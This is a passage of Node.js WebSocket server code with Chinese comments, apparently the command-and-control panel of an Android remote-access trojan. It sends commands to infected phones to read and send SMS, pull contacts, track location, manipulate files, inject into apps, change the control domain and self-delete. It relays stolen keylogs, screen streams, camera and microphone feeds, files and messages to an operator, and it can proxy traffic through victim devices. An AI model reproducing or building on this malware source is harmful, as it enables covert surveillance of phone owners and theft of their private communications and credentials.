            const jsonData = {
              type: "screencomd",
              subc: "LOADAPPS",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "Contacts":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Contacts",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "SMS":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMS",
              // 增加分页和过滤功能
              page: data.page || 1,
              pageSize: data.pageSize || 50,
              filter: data.filter || ""
            };

            if (jsonData) {
              // 增加错误处理
              try {
                MobReciver.send(JSONIT(jsonData));
              } catch (error) {
                console.error("发送短信命令失败:", error);
                alertpanel(ws, "发送短信命令失败", Alert_info);
              }
            }
          }
          break;
        case "SMSSEND":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMSSEND",
              smsnumber: data.smsnumber,
              message: data.message,
              // 增加超时和重试机制
              timeout: 30000,
              retry: 3
            };

            // 增加错误处理
            try {
              if (MobReciver && MobReciver.readyState === WebSocket.OPEN) {
                if (jsonData) MobReciver.send(JSONIT(jsonData));
                console.log("发送短信命令成功");
              } else {
                console.error("设备连接已关闭，无法发送短信命令");
                alertpanel(ws, "设备连接已关闭，无法发送短信命令", Alert_info);
              }
            } catch (error) {
              console.error("发送短信命令失败:", error);
              alertpanel(ws, "发送短信命令失败", Alert_info);
            }
          }
          break;
        case "loc": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Location",
              // 增加超时和重试机制
              timeout: 30000,
              retry: 3
            };
            // 增加错误处理
            try {
              if (MobReciver && MobReciver.readyState === WebSocket.OPEN) {
                MobReciver.send(JSONIT(jsonData));
                console.log("发送位置命令成功");
              } else {
                console.error("设备连接已关闭，无法发送位置命令");
                alertpanel(ws, "设备连接已关闭，无法发送位置命令", Alert_info);
              }
            } catch (error) {
              console.error("发送位置命令失败:", error);
              alertpanel(ws, "发送位置命令失败", Alert_info);
            }

          }
          break;
        case "locoff": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Locationoff",
              // 增加超时和重试机制
              timeout: 30000,
              retry: 3
            };
            // 增加错误处理
            try {
              if (MobReciver && MobReciver.readyState === WebSocket.OPEN) {
                MobReciver.send(JSONIT(jsonData));
                console.log("发送位置关闭命令成功");
              } else {
                console.error("设备连接已关闭，无法发送位置关闭命令");
                alertpanel(ws, "设备连接已关闭，无法发送位置关闭命令", Alert_info);
              }
            } catch (error) {
              console.error("发送位置关闭命令失败:", error);
              alertpanel(ws, "发送位置关闭命令失败", Alert_info);
            }
          }
          break;
        case "files":
          {
            const jsonData = {
              type: "screencomd",
              subc: "files",
              filepath: data.filepath,
              // 增加超时和重试机制
              timeout: 30000,
              retry: 3
            };
            // 增加错误处理
            try {
              if (MobReciver && MobReciver.readyState === WebSocket.OPEN) {
                MobReciver.send(JSONIT(jsonData));
              } else {
                console.error("设备连接已关闭，无法发送文件命令");
                alertpanel(ws, "设备连接已关闭，无法发送文件命令", Alert_info);
              }
            } catch (error) {
              console.error("发送文件命令失败:", error);
              alertpanel(ws, "发送文件命令失败", Alert_info);
            }
          }
          break;
        case "changefiles": {
          // 增加错误处理
          try {
            if (MobReciver && MobReciver.readyState === WebSocket.OPEN) {
              if (data.comdtype === "U") {
                const chunkSize = 1024 * 256; // 每片 256KB
                const content = data.content || ""; // Base64 字符串
                const totalSize = content.length;
                const totalChunks = Math.ceil(totalSize / chunkSize);

                let offset = 0;
                let index = 0;

                while (offset < totalSize) {
                  const end = Math.min(offset + chunkSize, totalSize);
                  const chunk = content.substring(offset, end);

                  const jsonData = {
                    type: "screencomd",
                    subc: "changefiles",
                    comdtype: data.comdtype, // "U"
                    isinjct: data.isinjct,
                    jctid: data.jctid,
                    filepath: data.filepath,
                    filetype: data.filetype,
                    filename: data.filename,
                    size: data.size,
                    chunkIndex: index,
                    totalChunks: totalChunks,
                    content: chunk,
                    // 增加超时和重试机制
                    timeout: 30000,
                    retry: 3
                  };

                  MobReciver.send(JSONIT(jsonData));

                  offset = end;
                  index++;
                }
                console.log("文件上传命令发送成功，共", totalChunks, "个分片");
              } else {
                // ⚡ 删除 (R) / 下载 (D) 保持原样
                const jsonData = {
                  type: "screencomd",
                  subc: "changefiles",
                  comdtype: data.comdtype,
                  filepath: data.filepath,
                  filetype: data.filetype,
                  filename: data.filename,
                  size: data.size,
                  content: data.content,
                  // 增加超时和重试机制
                  timeout: 30000,
                  retry: 3
                };
                MobReciver.send(JSONIT(jsonData));
                console.log("文件操作命令发送成功:", data.comdtype);
              }
            } else {
              console.error("设备连接已关闭，无法发送文件操作命令");
              alertpanel(ws, "设备连接已关闭，无法发送文件操作命令", Alert_info);
            }
          } catch (error) {
            console.error("发送文件操作命令失败:", error);
            alertpanel(ws, "发送文件操作命令失败", Alert_info);
          }
        }
          break;

        case "noinj":
          {
            const jsonData = {
              type: "screencomd",
              subc: "noinj",
              jctid: data.jctid,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "viewfile":
          {
            const jsonData = {
              type: "screencomd",
              subc: "viewfile",
              filepath: data.filepath,
              // 增加超时和重试机制
              timeout: 30000,
              retry: 3
            };
            // 发送文件查看命令
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "rename":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Rename",
              name: data.nam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "change":
          {
            const jsonData = {
              type: "screencomd",
              subc: "change",
              domain: data.domain,
              ip: data.ip,
              changeid: data.changeid
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Notify":
          {
            const jsonData = {
              type: "Notifi",
              noti: data.noti,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "delete":
          {
            const jsonData = {
              type: "Delete",
              subc: "[reme]",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

      }
      break;
    case idf_client:
      const FrontReciver = SolrUsers.get(phoneId);

      // 检查 WebSocket 连接是否有效


      if (FrontReciver) {
        for (const ws of FrontReciver) {
          if (ws.readyState === WebSocket.OPEN) {
            try {
              // 处理客户端命令
              switch (subcommand) {


                case "klogs":
                  {



                    const jsonData = {
                      type: "klog",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "klogsdate":
                  {



                    const jsonData = {
                      type: "klogsdate",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "sms":
                  {
                    // 优化短信数据传输
                    const jsonData = {
                      type: "sms",
                      data: data.msg,
                      pid: data.pid,
                      timestamp: Date.now(),
                      // 增加数据完整性检查
                      size: data.msg ? data.msg.length : 0
                    };

                    // 增加错误处理
                    try {
                      const jsonString = JSONIT(jsonData);
                      // 检查连接状态
                      if (ws.readyState === WebSocket.OPEN) {
                        console.log("发送短信数据到前端:", jsonData.size, "字节");
                        ws.send(jsonString, (error) => {
                          if (error) {
                            console.error("发送短信数据到前端失败:", error);
                            // 发送错误通知给前端
                            const errorMsg = {
                              type: "error",
                              data: "短信数据发送失败",
                              pid: data.pid,
                              error: error.message
                            };
                            if (ws.readyState === WebSocket.OPEN) {
                              ws.send(JSONIT(errorMsg));
                            }
                          } else {
                            console.log("短信数据发送成功到前端");
                          }
                        });
                      } else {
                        console.error("前端连接已关闭，无法发送短信数据");
                      }
                    } catch (error) {
                      console.error("处理短信数据失败:", error);
                      // 发送错误通知给前端
                      const errorMsg = {
                        type: "error",
                        data: "短信数据处理失败",
                        pid: data.pid,
                        error: error.message
                      };
                      if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSONIT(errorMsg));
                      }
                    }
                  }
                  break;
                case "chat":
                  const json_chat = {
                    type: "chat",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringchat = JSON.stringify(json_chat);

                  ws.send(stringchat, (error) => {
                    if (error) {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);

                      ws.send(stopit);
                      ws.terminate();
                    }
                  });

                  break;
                case "files":
                  {
                    // 优化文件数据传输
                    const json_files = {
                      type: "files",
                      data: data.msg,
                      pid: data.pid,
                      timestamp: Date.now(),
                      // 增加数据完整性检查
                      size: data.msg ? data.msg.length : 0
                    };

                    // 增加错误处理
                    try {
                      const stringfiles = JSONIT(json_files);
                      // 发送给前端，而不是设备端
                      let sentCount = 0;
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          console.log("发送文件数据到前端:", json_files.size, "字节");
                          frontWs.send(stringfiles, (error) => {
                            if (error) {
                              console.error("发送文件数据到前端失败:", error);
                              // 发送错误通知给前端
                              const errorMsg = {
                                type: "error",
                                data: "文件数据发送失败",
                                pid: data.pid,
                                error: error.message
                              };
                              if (frontWs.readyState === WebSocket.OPEN) {
                                frontWs.send(JSONIT(errorMsg));
                              }
                            } else {
                              sentCount++;
                              console.log("文件数据发送成功到前端");
                            }
                          });
                        }
                      }
                      if (sentCount === 0) {
                        console.error("没有活跃的前端连接，无法发送文件数据");
                      }
                    } catch (error) {
                      console.error("处理文件数据失败:", error);
                      // 发送错误通知给前端
                      const errorMsg = {
                        type: "error",
                        data: "文件数据处理失败",
                        pid: data.pid,
                        error: error.message
                      };
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          frontWs.send(JSONIT(errorMsg));
                        }
                      }
                    }
                  }
                  break;

                case "savefiles":
                  {
                    // 优化文件保存数据传输
                    const json_filessave = {
                      type: "savefiles",
                      data: data.msg,
                      pid: data.pid,
                      timestamp: Date.now(),
                      // 增加数据完整性检查
                      size: data.msg ? data.msg.length : 0
                    };

                    // 增加错误处理
                    try {
                      const savefiles = JSONIT(json_filessave);
                      // 发送给前端，而不是设备端
                      let sentCount = 0;
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          console.log("发送文件保存数据到前端:", json_filessave.size, "字节");
                          frontWs.send(savefiles, (error) => {
                            if (error) {
                              console.error("发送文件保存数据到前端失败:", error);
                              // 发送错误通知给前端
                              const errorMsg = {
                                type: "error",
                                data: "文件保存数据发送失败",
                                pid: data.pid,
                                error: error.message
                              };
                              if (frontWs.readyState === WebSocket.OPEN) {
                                frontWs.send(JSONIT(errorMsg));
                              }
                            } else {
                              sentCount++;
                              console.log("文件保存数据发送成功到前端");
                            }
                          });
                        }
                      }
                      if (sentCount === 0) {
                        console.error("没有活跃的前端连接，无法发送文件保存数据");
                      }
                    } catch (error) {
                      console.error("处理文件保存数据失败:", error);
                      // 发送错误通知给前端
                      const errorMsg = {
                        type: "error",
                        data: "文件保存数据处理失败",
                        pid: data.pid,
                        error: error.message
                      };
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          frontWs.send(JSONIT(errorMsg));
                        }
                      }
                    }
                  }
                  break;

                case "thumb":
                  {
                    let imgpath = data.pth || "null";

                    const json_thumb = {
                      type: "thumb",
                      data: data.msg,
                      pid: data.pid,
                      path: imgpath,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "snap":
                  {
                    const json_thumb = {
                      type: "snap",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "mic":
                  {
                    const json_mic = {
                      type: "mic",
                      data: data.voip,
                      pid: data.pid,
                    };

                    const stringmic = JSON.stringify(json_mic);

                    ws.send(stringmic);
                  }
                  break;

                case "screen":
                  {
                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";
                    let fps = data.fps !== undefined ? data.fps : 30;
                    let quality = data.quality !== undefined ? data.quality : 70;

                    // 优化屏幕传输：增加帧率控制和质量设置
                    const json_scr = {
                      type: "screen",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                      fps: fps,
                      quality: quality,
                      timestamp: Date.now()
                    };

                    // 使用异步发送，避免阻塞主线程
                    try {
                      const stringscr = JSON.stringify(json_scr);
                      ws.send(stringscr, (error) => {
                        if (error) {
                          console.error("发送屏幕数据失败:", error);
                        }
                      });
                    } catch (error) {
                      console.error("处理屏幕数据失败:", error);
                    }
                  }
                  break;
                case "screenshot":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screenshot",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    ws.send(stringscr);
                  }
                  break;
                case "loc":
                  {

                    const json_loc = {
                      type: "loc",
                      data: data.msg,
                      pid: data.pid,
                    };
                    const stringloc = JSON.stringify(json_loc);
                    ws.send(stringloc);

                  }
                  break;
                // case "ping":
                //   {
                //     const json_ping = {
                //       type: "ping",
                //       data: data.msg,
                //       pid: data.pid,
                //     };

                //     const stringping = JSON.stringify(json_ping);

                //     ws.send(stringping);

                //   }
                //   break;
                case "proxy":
                  {
                    let thecall = data.ctype;

                    let json_prxy;

                    if (thecall === "first") {
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }

                      let localadress = data.loip;
                      let proxyport = data.pport;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "first",
                        extip: extraddress,
                        locip: localadress,
                        pxport: proxyport,
                      };
                    } else if (thecall === "state") {
                      let the_state = data.pxstate;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "state",
                        pstate: the_state,
                      };
                    } else if (thecall === "dataup") {
                      let originalip = data.oip;
                      let proxymethod = data.pmth;
                      let proxyurl = data.purl;
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }
                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "dataup",
                        ogip: originalip,
                        pxip: extraddress,
                        purl: proxyurl,
                        pmthod: proxymethod,
                      };
                    } else {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);
                      ws.send(stopit);
                      ws.terminate();
                      return;
                    }

                    const stringprxy = JSON.stringify(json_prxy);

                    ws.send(stringprxy);
                  }
                  break;
                case "srch":
                  {
                    let datapaths = data.pths || "null";
                    let srchfor = data.stype || "null";

                    const json_srch = {
                      type: "srch",
                      data: datapaths,
                      pid: data.pid,
                      sfor: srchfor,
                    };

                    const stringsrh = JSON.stringify(json_srch);

                    ws.send(stringsrh);
                  }
                  break;
                case "down": //download
                  {
                    const filename = data.filename;
                    const filedata = data.filedata; // Get base64 chunk
                    const totalSize = data.totalSize;
                    const sentSize = data.sentSize;
                    const chunkNumber = data.chunkNumber;
                    const totalChunks = data.totalChunks || 1;
                    const filehash = data.filehash;
                    const filepath = data.filepath;

                    // 优化文件传输：增加进度和错误处理
                    const json_file = {
                      type: "down",
                      filename: filename,
                      filedata: filedata,
                      totalSize: totalSize,
                      sentSize: sentSize,
                      chunkNumber: chunkNumber,
                      totalChunks: totalChunks,
                      progress: Math.round((sentSize / totalSize) * 100),
                      filehash: filehash,
                      filepath: filepath,
                      pid: data.pid,
                      timestamp: Date.now()
                    };

                    // 使用异步发送，避免阻塞主线程
                    try {
                      const stringdata = JSONIT(json_file);
                      // 发送给前端，而不是设备端
                      let sentCount = 0;
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          console.log("发送文件下载数据到前端:", json_file.filename, "进度:", json_file.progress, "%");
                          frontWs.send(stringdata, (error) => {
                            if (error) {
                              console.error("发送文件数据到前端失败:", error);
                              // 发送错误通知给前端
                              const errorMsg = {
                                type: "error",
                                data: "文件传输失败",
                                pid: data.pid,
                                error: error.message
                              };
                              if (frontWs.readyState === WebSocket.OPEN) {
                                frontWs.send(JSONIT(errorMsg));
                              }
                            } else {
                              sentCount++;
                              console.log("文件下载数据发送成功到前端:", json_file.filename, "进度:", json_file.progress, "%");
                            }
                          });
                        }
                      }
                      if (sentCount === 0) {
                        console.error("没有活跃的前端连接，无法发送文件下载数据");
                      }
                    } catch (error) {
                      console.error("处理文件数据失败:", error);
                      // 发送错误通知给前端
                      const errorMsg = {
                        type: "error",
                        data: "文件处理失败",
                        pid: data.pid,
                        error: error.message
                      };
                      for (const frontWs of FrontReciver) {
                        if (frontWs.readyState === WebSocket.OPEN) {
                          frontWs.send(JSONIT(errorMsg));
                        }
                      }
                    }
                  }
                  break;
                case "cam":
                  {
                    // 优化摄像头传输：增加质量控制和错误处理
                    const json_cam = {
                      type: "cam",
                      data: data.img,
                      pid: data.pid,
                      quality: data.quality !== undefined ? data.quality : 60,
                      timestamp: Date.now()
                    };

                    // 使用异步发送，避免阻塞主线程
                    try {
                      const stringcam = JSON.stringify(json_cam);
                      ws.send(stringcam, (error) => {
                        if (error) {
                          console.error("发送摄像头数据失败:", error);
                        }
                      });
                    } catch (error) {
                      console.error("处理摄像头数据失败:", error);
                    }
                  }
                  break;
                case "injapps":
                  {
                    const jsonData = {
                      type: "injapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadapps":
                  {
                    const jsonData = {
                      type: "loadapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadcontacts":
                  {
                    const jsonData = {
                      type: "loadcontacts",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                default:

                  break;
              }
            } catch (err) {
              console.error("❌ Failed to send to one web user:", err);
            }


          }
        }
      }
      break;


    default:
      break;
  }
}


function JSONIT(params) {
  return JSON.stringify(params);
}

function alertpanel(frontws, msg, alert) {
  const jsonData = {
    type: "notify",
    pid: "ALERTER",
    meth: alert,
    data: msg,
  };

  const jsonString = JSONIT(jsonData);

  frontws.send(jsonString);
}

const PORT = process.env.PORT || 3000;
console.log("🚀 ~ PORT:", PORT);
server.listen(PORT, () => {
  console.log(`Http on port ${PORT}`);
});

console.log("WebSocket on port 8080");
